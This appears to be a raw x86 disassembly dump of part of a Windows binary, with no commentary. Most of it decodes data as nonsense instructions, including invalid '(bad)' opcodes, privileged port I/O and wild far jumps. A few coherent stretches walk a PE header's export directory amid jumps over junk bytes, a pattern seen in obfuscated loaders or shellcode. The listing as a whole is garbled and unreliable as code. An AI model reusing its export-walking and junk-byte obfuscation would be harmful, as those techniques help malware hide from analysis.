  403019:	retf   
  40301a:	jge    0x403036
  40301c:	push   esi
  40301d:	in     al,dx
  40301e:	addr16 loop 0x40304a
  403021:	call   0x46ddc1eb
  403026:	dec    ecx
  403027:	not    DWORD PTR [ebx-0x30e5b0a6]
  40302d:	cmc    
  40302e:	and    eax,0x92a44411
  403033:	arpl   WORD PTR [edx-0x24],ax
  403036:	out    0x79,eax
  403038:	add    esp,esp
  40303a:	out    0xc5,al
  40303c:	pop    edx
  40303d:	cs push ebp
  40303f:	mov    ds:0x4b9ecabc,eax
  403044:	fiadd  DWORD PTR [esp]
  403047:	push   eax
  403048:	xchg   esi,eax
  403049:	dec    edx
  40304a:	inc    edx
  40304b:	mov    DWORD PTR [ebp-0x65],ebx
  40304e:	and    eax,0xf06dcf32
  403053:	jecxz  0x402ffd
  403055:	or     BYTE PTR [ebx-0x72],ah
  403058:	ret    
  403059:	enter  0xe388,0x33
  40305d:	xor    ecx,DWORD PTR [edx-0x7e81e0a8]
  403063:	sbb    eax,0xeae16ee6
  403068:	repz inc edi
  40306a:	in     al,0xa5
  40306c:	or     esi,0x8006d11a
  403072:	push   ds
  403073:	push   ebx
  403074:	push   ecx
  403075:	retf   
  403076:	sbb    DWORD PTR [esi],0xd32920a9
  40307c:	in     eax,dx
  40307d:	mov    dl,0xaf
  40307f:	jecxz  0x40300c
  403081:	inc    ebp
  403082:	or     BYTE PTR [ebx-0x651607b3],cl
  403088:	add    al,BYTE PTR [eax]
  40308a:	add    cl,dl
  40308c:	int3   
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	je     0x403045
  403099:	adc    eax,0x7815929f
  40309e:	js     0x40309e
  4030a0:	jle    0x40311a
  4030a2:	js     0x4030bc
  4030a4:	ins    BYTE PTR es:[edi],dx
  4030a5:	xchg   edx,eax
  4030a6:	(bad)  
  4030a7:	jl     0x5fef198e
  4030ad:	sbb    BYTE PTR [ebx+edi*2+0x36],ch
  4030b1:	fnstenv [edx-0x1c0d6825]
  4030b7:	push   esp
  4030b8:	je     0x40303a
  4030ba:	fcomi  st,st(1)
  4030bc:	out    0xcf,eax
  4030be:	add    edi,ebp
  4030c0:	daa    
  4030c1:	cmp    BYTE PTR [edi-0x3f],cl
  4030c4:	dec    ebx
  4030c5:	mov    DWORD PTR [esp+ebp*8+0x7a],ebp
  4030c9:	loop   0x40312d
  4030cb:	ins    DWORD PTR es:[edi],dx
  4030cc:	pop    ds
  4030cd:	mov    dh,0x1c
  4030cf:	push   0x17
  4030d1:	aad    0x63
  4030d3:	adc    edi,DWORD PTR [edi-0xaa667bc]
  4030d9:	mov    dh,bl
  4030db:	jle    0x40311e
  4030dd:	add    ebp,DWORD PTR ds:0xe2891a7d
  4030e3:	es cmp eax,0xba489568
  4030e9:	out    dx,eax
  4030ea:	int3   
  4030eb:	ret    0x6f09
  4030ee:	pop    eax
  4030ef:	adc    esi,edx
  4030f1:	dec    esi
  4030f2:	pop    ss
  4030f3:	adc    esp,ecx
  4030f5:	jae    0x4030e4
  4030f7:	jge    0x40309e
  4030f9:	inc    eax
  4030fa:	into   
  4030fb:	and    dl,BYTE PTR [eax+0x5c]
  4030fe:	ret    
  4030ff:	cli    
  403100:	cs xchg ebx,eax
  403102:	jmp    0xbd55:0x2daf7b97
  403109:	int    0xc
  40310b:	xchg   esi,eax
  40310c:	jb     0x4030c4
  40310e:	or     eax,esi
  403110:	shr    dl,cl
  403112:	ret    
  403113:	daa    
  403114:	inc    edx
  403115:	jo     0x403117
  403117:	xchg   ebx,eax
  403118:	fbld   TBYTE PTR fs:[ebx+0x79]
  40311c:	fdiv   DWORD PTR [edi-0x40]
  40311f:	mov    bh,0x9c
  403121:	jle    0x403139
  403123:	cmp    eax,0x90c56955
  403128:	or     DWORD PTR [eax+0x4b],0x42482138
  40312f:	push   eax
  403130:	jo     0x40317d
  403132:	jle    0x4030eb
  403134:	xor    BYTE PTR [eax-0x637b1e19],bl
  40313a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40313b:	fiadd  WORD PTR [edx+ebp*2-0x2c2c8bb6]
  403142:	and    DWORD PTR [ebx-0x31],esp
  403145:	mov    ebx,0x493c6580
  40314a:	xor    eax,0xd971d172
  40314f:	mov    eax,ds:0x71fa4634
  403154:	mov    bh,0xad
  403156:	pop    edx
  403157:	mov    esp,0x33f43d89
  40315c:	pusha  
  40315d:	in     al,dx
  40315e:	adc    al,0x1c
  403160:	adc    DWORD PTR [ecx+ebp*2],0x2c4a23b8
  403167:	sbb    eax,0xba773f14
  40316c:	push   edx
  40316d:	pusha  
  40316e:	mul    DWORD PTR fs:[edx]
  403171:	loop   0x403103
  403173:	cs loope 0x4031df
  403176:	jae    0x403156
  403178:	leave  
  403179:	pop    ebx
  40317a:	mov    ecx,0x8d5476a7
  40317f:	sub    eax,0xe605910b
  403184:	jbe    0x4031d4
  403186:	cld    
  403187:	xor    BYTE PTR [edx+0x23a7973f],dh
  40318d:	or     DWORD PTR [edx-0x2b],eax
  403190:	es mov al,bh
  403193:	(bad)  
  403194:	dec    ebp
  403195:	pcmpgtw mm1,QWORD PTR [edx+0xa]
  403199:	fisub  WORD PTR [ebx]
  40319b:	inc    ecx
  40319c:	sti    
  40319d:	lods   al,BYTE PTR ds:[esi]
  40319e:	sub    BYTE PTR [esi],0x0
  4031a1:	push   0xe
  4031a3:	xchg   ebx,eax
  4031a4:	xchg   esp,eax
  4031a5:	pushf  
  4031a6:	mov    al,ds:0x7126cbe6
  4031ab:	mov    ch,0x70
  4031ad:	lahf   
  4031ae:	sar    DWORD PTR [ebx+0x2f],0x98
  4031b2:	sbb    ecx,0x96b126ba
  4031b8:	pop    esp
  4031b9:	jmp    0x403231
  4031bb:	add    ecx,eax
  4031bd:	iret   
  4031be:	sbb    esp,DWORD PTR [edi-0x57]
  4031c1:	(bad)  
  4031c2:	lock ror DWORD PTR [edx],1
  4031c5:	aad    0x89
  4031c7:	cli    
  4031c8:	push   es
  4031c9:	jo     0x403224
  4031cb:	xchg   ebx,eax
  4031cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031cd:	mov    eax,0x893cb7e4
  4031d2:	sub    bl,0x7c
  4031d5:	lds    esi,FWORD PTR [esi+0x5592aae2]
  4031db:	pushf  
  4031dc:	int    0x72
  4031de:	lock retf 
  4031e0:	sbb    BYTE PTR [eax],0x84
  4031e3:	sar    esi,0xda
  4031e6:	sub    al,0x4e
  4031e8:	es mov cl,0x43
  4031eb:	in     eax,dx
  4031ec:	stos   DWORD PTR es:[edi],eax
  4031ed:	mov    ah,0x68
  4031ef:	xor    eax,0x26bcb80b
  4031f4:	icebp  
  4031f5:	dec    edi
  4031f6:	fidiv  WORD PTR [ebp-0x56]
  4031f9:	das    
  4031fa:	xchg   ebx,eax
  4031fb:	sbb    al,0x27
  4031fd:	rcr    WORD PTR [edx-0x47],1
  403201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403202:	cmp    BYTE PTR [edi+0x6e],ch
  403205:	arpl   WORD PTR [ecx],bp
  403207:	outs   dx,BYTE PTR ds:[esi]
  403208:	add    DWORD PTR [ebx],ebp
  40320a:	cld    
  40320b:	cld    
  40320c:	hlt    
  40320d:	pop    ebx
  40320e:	inc    esi
  40320f:	(bad)  
  403210:	nop
  403211:	(bad)  
  403213:	iret   
  403214:	or     ebp,esp
  403216:	add    eax,0x46364607
  40321b:	push   ecx
  40321c:	mov    gs,WORD PTR [edx+0x41c679ec]
  403222:	(bad)  
  403223:	cmp    esp,edx
  403225:	adc    DWORD PTR [eax+0xa],0x40390917
  40322c:	or     ebp,DWORD PTR [ebx]
  40322e:	fisubr DWORD PTR [eax]
  403230:	ins    DWORD PTR es:[edi],dx
  403231:	bound  esi,QWORD PTR [ebx]
  403233:	inc    ebx
  403234:	lds    eax,FWORD PTR [ebx-0x3a1927d3]
  40323a:	xchg   ebx,eax
  40323b:	cmp    esp,DWORD PTR [ecx-0x385fac02]
  403241:	jmp    0x4031d9
  403243:	(bad)  
  403245:	rol    BYTE PTR [ebx],0x28
  403248:	mov    bh,0x2c
  40324a:	popa   
  40324b:	push   edi
  40324c:	fdiv   DWORD PTR [edx]
  40324e:	in     eax,0xd8
  403250:	mov    ds:0xcdccb084,al
  403255:	or     eax,0x49288123
  40325a:	in     ax,dx
  40325c:	fistp  WORD PTR [edi+ebp*2]
  40325f:	pop    eax
  403260:	ins    DWORD PTR es:[edi],dx
  403261:	adc    BYTE PTR ds:0xe207d2bc,ah
  403267:	addr16 sub al,0xf0
  40326a:	call   FWORD PTR [ebp+0x44]
  40326d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326e:	jns    0x403217
  403270:	sub    al,0x2c
  403272:	(bad)  [ebx-0x6781702b]
  403278:	xchg   ecx,eax
  403279:	adc    eax,0x168442ed
  40327e:	std    
  40327f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403280:	add    BYTE PTR [edi],dh
  403282:	and    BYTE PTR [edi],dh
  403284:	sbb    edi,edi
  403286:	cmp    BYTE PTR [ebx+0x48f5703b],0xfd
  40328d:	xor    al,0x35
  40328f:	xchg   ebp,eax
  403290:	iret   
  403291:	pop    es
  403292:	pushf  
  403293:	ins    DWORD PTR es:[edi],dx
  403294:	pop    ecx
  403295:	push   0xfffffff1
  403297:	add    DWORD PTR ds:0xcd38299,edi
  40329d:	pop    es
  40329e:	mov    ebx,DWORD PTR [ecx-0x3d047ebc]
  4032a4:	popf   
  4032a5:	fs xor eax,0x2270547c
  4032ab:	adc    DWORD PTR [edi+edi*2-0x21],0xffffffa3
  4032b0:	mov    esi,0xa2a04e76
  4032b5:	push   cs
  4032b6:	dec    ebp
  4032b7:	xchg   esi,eax
  4032b8:	jge    0x4032d2
  4032ba:	ins    BYTE PTR es:[edi],dx
  4032bb:	jp     0x4032b3
  4032bd:	mov    bl,0xda
  4032bf:	ins    DWORD PTR es:[edi],dx
  4032c0:	xor    eax,eax
  4032c2:	retf   0x4241
  4032c5:	mov    edx,edi
  4032c7:	xor    al,0xb0
  4032c9:	pop    esp
  4032ca:	pop    esp
  4032cb:	enter  0x7ac5,0xf2
  4032cf:	aad    0x3
  4032d1:	inc    esi
  4032d2:	dec    ebp
  4032d3:	and    ebx,DWORD PTR [ecx]
  4032d5:	mov    eax,0x59bb89b3
  4032da:	rcr    edi,1
  4032dc:	mov    ebp,0x3af15ed
  4032e1:	loope  0x4032cf
  4032e3:	jp     0x4032c8
  4032e5:	bound  eax,QWORD PTR [eax+0x6b73d236]
  4032eb:	jno    0x403330
  4032ed:	mov    ds:0xc51f45f7,al
  4032f2:	(bad)  
  4032f3:	push   ss
  4032f4:	pop    ecx
  4032f5:	out    dx,al
  4032f6:	mov    al,0x60
  4032f8:	test   eax,0xb83cfa24
  4032fd:	ins    DWORD PTR es:[edi],dx
  4032fe:	test   BYTE PTR [ebp-0x44bb5341],al
  403304:	sahf   
  403305:	push   ss
  403306:	cmp    ah,BYTE PTR [ecx+0x60]
  403309:	mov    dl,0xb6
  40330b:	xlat   BYTE PTR ds:[ebx]
  40330c:	mov    cl,BYTE PTR [ebx+0x42]
  40330f:	xor    esi,DWORD PTR [ebp-0x439ebe2e]
  403315:	retf   
  403316:	jb     0x40332e
  403318:	aam    0x7d
  40331a:	sbb    bh,ch
  40331c:	mov    eax,ds:0xe2f81d8f
  403321:	inc    eax
  403322:	sub    BYTE PTR [edx+edi*8],bl
  403325:	xor    eax,esi
  403327:	add    eax,edi
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx+0x22c23cb6]
  403372:	jp     0x403365
  403374:	lahf   
  403375:	adc    BYTE PTR [edx],bl
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x403394
  40337e:	xor    DWORD PTR [ebx+0x29],edi
  403381:	cmp    BYTE PTR [ebx],dl
  403383:	test   DWORD PTR [esi-0xe3a6bb0],eax
  403389:	ss jge 0x403317
  40338c:	mov    bh,0x23
  40338e:	mov    eax,ds:0x808d653a
  403393:	les    eax,FWORD PTR [esi+ebx*1+0x2a]
  403397:	push   0x44
  403399:	mov    ebp,0x7db2ad31
  40339e:	stos   BYTE PTR es:[edi],al
  40339f:	in     al,dx
  4033a0:	clc    
  4033a1:	push   esi
  4033a2:	scas   eax,DWORD PTR es:[edi]
  4033a3:	js     0x40332f
  4033a5:	leave  
  4033a6:	mov    ebx,0xcfaad86e
  4033ab:	push   cs
  4033ac:	jmp    0xfc8445d7
  4033b1:	xchg   esp,eax
  4033b2:	mov    ecx,0x8de81b05
  4033b7:	fmulp  st(2),st
  4033b9:	xchg   ecx,eax
  4033ba:	into   
  4033bb:	jl     0x403427
  4033bd:	xchg   edx,eax
  4033be:	xor    al,0x66
  4033c0:	jbe    0x4033ca
  4033c2:	out    0x41,al
  4033c4:	jl     0x4033c1
  4033c6:	fidivr DWORD PTR [eax+0x17]
  4033c9:	ins    DWORD PTR es:[edi],dx
  4033ca:	cmp    BYTE PTR [eax-0x262f5ad9],ch
  4033d0:	lahf   
  4033d1:	adc    al,0x77
  4033d3:	push   es
  4033d4:	adc    dl,BYTE PTR [eax+0x77ea38d9]
  4033da:	and    eax,0x2d7bf4e9
  4033df:	and    al,0x90
  4033e1:	aam    0x61
  4033e3:	xor    BYTE PTR [edx-0x71332ab8],0xcd
  4033ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033eb:	rcr    eax,1
  4033ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ee:	test   al,0x58
  4033f0:	test   al,0xe1
  4033f2:	call   0xb31d:0x899a6a7
  4033f9:	lods   eax,DWORD PTR ds:[esi]
  4033fa:	pop    edi
  4033fb:	sub    dh,0xe8
  4033fe:	imul   ebx,edx,0xf3775385
  403404:	cmp    dl,dh
  403406:	inc    ebx
  403407:	cmp    dh,dh
  403409:	cmp    edx,ebx
  40340b:	test   DWORD PTR [edx],ebx
  40340d:	jns    0x403488
  40340f:	jg     0x4033cc
  403411:	das    
  403412:	jnp    0x403422
  403414:	adc    eax,0x56fd6d89
  403419:	pop    ebx
  40341a:	jmp    0x4033bc
  40341c:	adc    ecx,eax
  40341e:	fst    st(0)
  403420:	lds    ecx,FWORD PTR [edi+ebp*8+0x1e]
  403424:	cdq    
  403425:	inc    esi
  403426:	or     edi,esp
  403428:	div    DWORD PTR [ebp+0x27]
  40342b:	mov    cl,0x94
  40342d:	add    BYTE PTR [edi-0x7b],ch
  403430:	dec    eax
  403431:	push   es
  403432:	mov    BYTE PTR [edi-0x54],ah
  403435:	mov    bl,0x5f
  403437:	test   eax,0x98a663
  40343c:	xchg   esp,eax
  40343d:	mov    edx,0x9458f902
  403442:	sub    ah,ch
  403444:	les    ebx,FWORD PTR [eax+0x14]
  403447:	jg     0x4033e8
  403449:	stos   BYTE PTR es:[edi],al
  40344a:	or     cl,BYTE PTR [edx+ecx*8+0x74]
  40344e:	xchg   DWORD PTR [ecx+0x32b3e327],ecx
  403454:	js     0x4034bc
  403456:	test   eax,0x680d2d9d
  40345b:	jb     0x403450
  40345d:	xchg   ebx,eax
  40345e:	ficom  DWORD PTR [edi]
  403460:	pop    ebx
  403461:	ja     0x40348d
  403463:	jne    0x4034b1
  403465:	loopne 0x4034b4
  403467:	pop    esp
  403468:	shl    ebp,1
  40346a:	scas   al,BYTE PTR es:[edi]
  40346b:	outs   dx,BYTE PTR ds:[esi]
  40346c:	push   ebx
  40346d:	stos   DWORD PTR es:[edi],eax
  40346e:	pop    ss
  40346f:	mov    ecx,0x92bbefa1
  403474:	lea    ebp,[ebx+0x38491ff8]
  40347a:	pop    esp
  40347b:	inc    edx
  40347c:	dec    edx
  40347d:	push   es
  40347e:	or     esp,DWORD PTR [esi-0x391ba28c]
  403484:	push   ecx
  403485:	xchg   ecx,eax
  403486:	ss mov dl,0x55
  403489:	stos   DWORD PTR es:[edi],eax
  40348a:	ja     0x40348c
  40348c:	dec    esp
  40348d:	jp     0x403434
  40348f:	ret    0x9325
  403492:	pop    edx
  403493:	int    0xbb
  403495:	xor    esp,esi
  403497:	mov    cl,0xb3
  403499:	mov    bl,0x3
  40349b:	pusha  
  40349c:	test   BYTE PTR [eax],ah
  40349e:	leave  
  40349f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034a0:	add    eax,0xc65aea6c
  4034a5:	sbb    bl,BYTE PTR [edx+edi*1-0xf]
  4034a9:	fld    DWORD PTR [ebp-0x1e8b7ee5]
  4034af:	stc    
  4034b0:	gs xor eax,0xef0f6b7d
  4034b6:	jb     0x403511
  4034b8:	pop    ecx
  4034b9:	and    esi,DWORD PTR [ecx+0x216e2251]
  4034bf:	scas   al,BYTE PTR es:[edi]
  4034c0:	xor    eax,0x1543f01f
  4034c5:	xor    DWORD PTR [ecx-0x3c919010],esi
  4034cb:	aam    0xb
  4034cd:	neg    DWORD PTR [eax+0x9]
  4034d0:	test   al,0x7a
  4034d2:	fdivr  DWORD PTR [eax+0x5b]
  4034d5:	cmp    eax,0x1e86c211
  4034da:	push   esi
  4034db:	jno    0x403535
  4034dd:	push   ebx
  4034de:	xchg   edx,eax
  4034df:	sbb    al,0xfb
  4034e1:	xchg   esi,eax
  4034e2:	repz test BYTE PTR [edx],ah
  4034e5:	cmp    ch,ah
  4034e7:	mov    ch,0x6
  4034e9:	stos   BYTE PTR es:[edi],al
  4034ea:	je     0x40348f
  4034ec:	inc    ebp
  4034ed:	stc    
  4034ee:	xor    ebp,DWORD PTR [esi-0x432d277d]
  4034f4:	imul   ecx,DWORD PTR [edi-0x29],0x6350df9a
  4034fb:	pop    ebx
  4034fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034fd:	cmp    BYTE PTR [edi],al
  4034ff:	or     BYTE PTR [esi+0x0],cl
  403502:	cmc    
  403503:	repz push esi
  403505:	or     al,dh
  403507:	or     eax,0x2d66c3ab
  40350c:	or     ecx,DWORD PTR [eax-0x10]
  40350f:	retf   
  403510:	xchg   ecx,eax
  403511:	mov    eax,ds:0x7ffe0d7a
  403516:	xchg   esi,eax
  403517:	shr    BYTE PTR [eax],0xd9
  40351a:	sbb    al,0xe9
  40351c:	dec    eax
  40351d:	sub    DWORD PTR cs:[edi-0x338169ca],ecx
  403524:	call   0x182a9dc7
  403529:	addr16 jp 0x4035a8
  40352c:	sbb    al,0x1
  40352e:	or     esi,esp
  403530:	fcomp  DWORD PTR [edx]
  403532:	push   edx
  403533:	mov    ds:0x7d934f0d,eax
  403538:	outs   dx,BYTE PTR ds:[esi]
  403539:	add    DWORD PTR [ecx-0x7],0x50
  40353d:	pop    es
  40353e:	pop    ss
  40353f:	ins    DWORD PTR es:[edi],dx
  403540:	pop    ebp
  403541:	push   edx
  403542:	fild   QWORD PTR [esi]
  403544:	test   al,0xa9
  403546:	push   ebp
  403547:	push   edi
  403548:	xor    eax,0x4ada08d5
  40354d:	xchg   edi,eax
  40354e:	add    dh,BYTE PTR [ecx+ebx*1]
  403551:	ror    DWORD PTR [edx],1
  403553:	popa   
  403554:	push   edx
  403555:	push   0xc8f5896d
  40355a:	fistp  DWORD PTR [esi-0x74]
  40355d:	int    0x5f
  40355f:	mov    edi,0x739f18d0
  403564:	fdiv   DWORD PTR [edx+0x3]
  403567:	out    dx,eax
  403568:	mov    eax,0xfe1c2d79
  40356d:	xor    dl,bh
  40356f:	adc    al,0xab
  403571:	dec    esp
  403572:	sti    
  403573:	sbb    dh,BYTE PTR [edi+0x50c3a481]
  403579:	outs   dx,DWORD PTR ds:[esi]
  40357a:	je     0x403597
  40357c:	fistp  DWORD PTR [ebp+0x79bb5f94]
  403582:	mov    esp,ecx
  403584:	adc    al,0x4c
  403586:	xchg   al,dh
  403588:	sub    al,0x90
  40358a:	test   DWORD PTR [esi+0x1a0b8e67],esi
  403590:	fidiv  WORD PTR [edi+0x55]
  403593:	mov    eax,ds:0xdb7ecda8
  403598:	xchg   esi,eax
  403599:	loopne 0x40352d
  40359b:	(bad)  
  40359c:	and    al,0x9d
  40359e:	imul   al
  4035a0:	inc    ebp
  4035a1:	xor    BYTE PTR [esi],dl
  4035a3:	aad    0x6a
  4035a5:	and    esp,esi
  4035a7:	sbb    DWORD PTR [ebp+0x56],0x739cfa95
  4035ae:	not    BYTE PTR [edi-0x75]
  4035b1:	add    edx,DWORD PTR [edx-0xc]
  4035b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b5:	retf   
  4035b6:	fidivr DWORD PTR [ebx+edx*2+0x217b3de8]
  4035bd:	sub    eax,0x1f7c2d6
  4035c2:	dec    eax
  4035c3:	sti    
  4035c4:	shl    cl,1
  4035c6:	mov    ecx,0x9863db01
  4035cb:	mov    ebx,0x9744cd30
  4035d0:	push   ebx
  4035d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035d2:	das    
  4035d3:	out    dx,al
  4035d4:	or     BYTE PTR [ebp+0x3e0e033c],dl
  4035da:	call   0x86fb:0x8b755792
  4035e1:	push   edi
  4035e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035e3:	(bad)  
  4035e4:	lock mov edi,0xae36363f
  4035ea:	jnp    0x403619
  4035ec:	push   es
  4035ed:	fstp   TBYTE PTR [ebx+0x7f5fe4e1]
  4035f3:	lea    esp,[ecx+0xa]
  4035f6:	push   ecx
  4035f7:	fdiv   DWORD PTR [edx-0x47bbc0b6]
  4035fd:	lds    esi,FWORD PTR [edx+0x33]
  403600:	mov    BYTE PTR [ebx],0xc7
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0xb374c1c8,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x4035c3
  40363f:	inc    edx
  403640:	jmp    0x4c4d:0x64da97df
  403647:	int3   
  403648:	xchg   ecx,eax
  403649:	test   DWORD PTR [ecx-0x4a],ebx
  40364c:	in     eax,dx
  40364d:	loopne 0x403606
  40364f:	and    BYTE PTR [edx-0x6f08ec1f],ch
  403655:	icebp  
  403656:	cld    
  403657:	ins    BYTE PTR es:[edi],dx
  403658:	sub    esp,DWORD PTR [ecx-0xe3811b0]
  40365e:	retf   0xc7cb
  403661:	sub    ebx,DWORD PTR [eax+ebx*8+0x32]
  403665:	lods   al,BYTE PTR ds:[esi]
  403666:	jo     0x40367c
  403668:	test   BYTE PTR [edi-0x15],bh
  40366b:	shr    BYTE PTR [edx+0x1de6e509],0x82
  403672:	xchg   ebp,eax
  403673:	lea    esi,[ecx+0x376be5ad]
  403679:	into   
  40367a:	dec    ecx
  40367b:	out    0x2e,al
  40367d:	ret    
  40367e:	stos   DWORD PTR es:[edi],eax
  40367f:	and    esi,edx
  403681:	into   
  403682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403683:	pmaxub mm1,QWORD PTR [eax+0x51]
  403687:	add    BYTE PTR [esi],cl
  403689:	arpl   WORD PTR ds:0x50a5fd3b,si
  40368f:	into   
  403690:	mov    esp,0x74561799
  403695:	ret    
  403696:	adc    cl,bh
  403698:	(bad)  
  403699:	out    0x7f,eax
  40369b:	mov    ebp,?
  40369d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40369e:	cmp    eax,0xfec85eb2
  4036a3:	jbe    0x4036b9
  4036a5:	in     al,dx
  4036a6:	aas    
  4036a7:	jne    0x403698
  4036a9:	call   0x48ed:0x45e837a
  4036b0:	sar    BYTE PTR [edx],cl
  4036b2:	pusha  
  4036b3:	mov    ch,BYTE PTR [ebp-0x48]
  4036b6:	ret    0xa37b
  4036b9:	inc    BYTE PTR [ecx-0x7]
  4036bc:	bound  edi,QWORD PTR [ebp+0x12160fc6]
  4036c2:	loope  0x4036bc
  4036c4:	cli    
  4036c5:	jbe    0x40371b
  4036c7:	pop    ebx
  4036c8:	mov    DWORD PTR [edi],0x6edca1f8
  4036ce:	test   al,0x97
  4036d0:	push   0x45
  4036d2:	fcom   QWORD PTR [ebp-0x4732a94b]
  4036d8:	stos   BYTE PTR es:[edi],al
  4036d9:	mov    ds:0x38a1eafc,al
  4036de:	cmp    al,0xef
  4036e0:	cmp    ch,dh
  4036e2:	cs or  al,0xa3
  4036e5:	add    al,0x9d
  4036e7:	cdq    
  4036e8:	mov    bh,0x72
  4036ea:	arpl   bx,ax
  4036ec:	inc    DWORD PTR [edx+eiz*2-0x50e2159f]
  4036f3:	mov    es,WORD PTR [ecx-0x39353e20]
  4036f9:	push   esi
  4036fa:	mov    WORD PTR [eax+0x1528f7a7],gs
  403700:	cs lods al,BYTE PTR ss:[esi]
  403703:	lahf   
  403704:	pop    ecx
  403705:	mov    al,ds:0xa3acca8a
  40370a:	repnz pop eax
  40370c:	cmp    al,0x76
  40370e:	jge    0x4036a5
  403710:	mov    al,ds:0x503e5f1f
  403715:	and    al,0xb8
  403717:	jmp    0x40369c
  403719:	xchg   ebp,eax
  40371a:	div    DWORD PTR [ecx]
  40371c:	jmp    0x403708
  40371e:	lea    edx,[edi+0x3e]
  403721:	ret    
  403722:	lahf   
  403723:	out    dx,al
  403724:	cmp    bl,ah
  403726:	jbe    0x40370e
  403728:	hlt    
  403729:	jnp    0x403765
  40372b:	fiadd  DWORD PTR [ebx]
  40372d:	fistp  QWORD PTR ds:0x1b405cdc
  403733:	mov    DWORD PTR [ecx],edx
  403735:	and    ch,cl
  403737:	adc    ah,BYTE PTR [edi-0xd]
  40373a:	iret   
  40373b:	outs   dx,DWORD PTR ds:[esi]
  40373c:	sub    dh,BYTE PTR [esi]
  40373e:	mov    ecx,0x9dc16cf6
  403743:	fcom   DWORD PTR [eax+0x5f66f5a3]
  403749:	jno    0x403768
  40374b:	rcr    DWORD PTR [edi+0x67bb6847],0x18
  403752:	(bad)  
  403754:	pop    edx
  403755:	ins    BYTE PTR es:[edi],dx
  403756:	add    esi,DWORD PTR [esi]
  403758:	in     al,0x7f
  40375a:	pop    ds
  40375b:	scas   eax,DWORD PTR es:[edi]
  40375c:	pop    edi
  40375d:	push   0x72
  40375f:	pmulhw mm3,mm3
  403762:	jge    0x40373d
  403764:	mov    ecx,0x20db7b46
  403769:	mov    bl,0xfa
  40376b:	sbb    al,0x1
  40376d:	mov    esp,0xd7011fc7
  403772:	and    DWORD PTR [edi-0x46],ebx
  403775:	out    dx,al
  403776:	xchg   ecx,esi
  403778:	sub    edi,ebp
  40377a:	pop    eax
  40377b:	add    eax,DWORD PTR [eax]
  40377d:	mov    ecx,0xba87bfe7
  403782:	mov    al,ds:0xc9facda2
  403787:	jle    0x4037b9
  403789:	sbb    ecx,DWORD PTR [ebp-0x7da8a29c]
  40378f:	adc    ebp,DWORD PTR [esi]
  403791:	into   
  403792:	push   esi
  403793:	lock mov cl,0xc
  403796:	and    DWORD PTR [edx+0x4f29d6ed],ebx
  40379c:	ins    BYTE PTR es:[edi],dx
  40379d:	(bad)  
  40379e:	sbb    BYTE PTR [ebp-0x41],dh
  4037a1:	and    eax,0x67e37f64
  4037a6:	sub    DWORD PTR [ecx+edi*1+0x67],ecx
  4037aa:	(bad)  
  4037ab:	in     eax,0x9a
  4037ad:	in     eax,0xc1
  4037af:	ja     0x4037ab
  4037b1:	mov    esp,0xcdf77381
  4037b6:	sbb    BYTE PTR [edi-0x25b0f144],bh
  4037bc:	clc    
  4037bd:	cmp    ebx,DWORD PTR [ecx]
  4037bf:	jne    0x4037d8
  4037c1:	mov    bl,BYTE PTR [ebx]
  4037c3:	and    cl,BYTE PTR [edx+ebp*8]
  4037c6:	add    bh,BYTE PTR [eax]
  4037c8:	sbb    DWORD PTR [ecx+0x3b],esi
  4037cb:	and    eax,0x5b0cd8fd
  4037d0:	leave  
  4037d1:	cdq    
  4037d2:	xor    DWORD PTR [eax-0x5cbc1555],0x60
  4037d9:	repz push eax
  4037db:	outs   dx,BYTE PTR ds:[esi]
  4037dc:	xor    eax,0x20f7ea82
